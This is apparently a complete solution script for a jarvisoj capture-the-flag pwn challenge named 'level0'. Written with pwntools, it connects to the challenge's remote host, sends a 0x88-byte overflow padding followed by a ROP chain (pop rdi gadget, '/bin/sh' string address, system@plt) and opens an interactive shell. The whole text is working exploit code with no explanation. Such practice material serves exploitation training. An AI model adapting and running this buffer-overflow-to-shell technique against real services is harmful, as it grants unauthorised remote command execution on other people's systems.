#!/usr/bin/python
from pwn import *
elf = ELF('./level0')
#sh = process('./level0')
sh = remote('pwn2.jarvisoj.com',9881)
system_func = elf.plt['system']
pop_rdi_ret = 0x400663
bin_sh = 0x400684
call_system = 0x400596

payload = 'a' * 0x88
#payload += p64(call_system)
payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(system_func)

sh.sendline(payload)
sh.interactive()

